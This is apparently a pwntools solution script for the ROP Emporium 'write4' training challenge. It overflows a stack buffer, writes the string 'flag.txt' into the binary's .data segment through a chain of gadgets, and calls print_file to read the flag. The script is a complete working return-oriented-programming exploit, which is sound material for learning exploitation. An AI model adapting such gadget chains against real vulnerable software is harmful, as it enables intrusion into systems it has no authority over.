#!/usr/bin/env python3

# -*- coding: UTF-8 -*

from pwn import *

elf = context.binary = ELF('write4')
p = process(elf.path)

mov_r15_to_r14 = 0x400628 # mov qword [r14], r15 ; ret   = in r2: aa , f~useful
pop_r14_r15 = 0x400690	  # pop r14 ; pop r15 ; ret
pop_rdi = 0x400693
print_file = 0x400510

data_segment = 0x00601028 # .data  = in r2: iS | with rabin2: rabin2 -S write4
command = b'flag.txt'

xpl = b'A' * 40
xpl += p64(pop_r14_r15)
xpl += p64(data_segment)   	# [r14] = data segment
xpl += command				# r15 = "flag.txt"

xpl += p64(mov_r15_to_r14) # end. de command vai para o valor de data segment, formando assim o endereço do flag.txt
# em r14 vai estar o nosso flag.txt

xpl += p64(pop_rdi)
xpl += p64(data_segment)
xpl += p64(print_file)

p.sendline(xpl)
p.interactive()

with open("payload", "wb") as file:
	file.write(xpl)
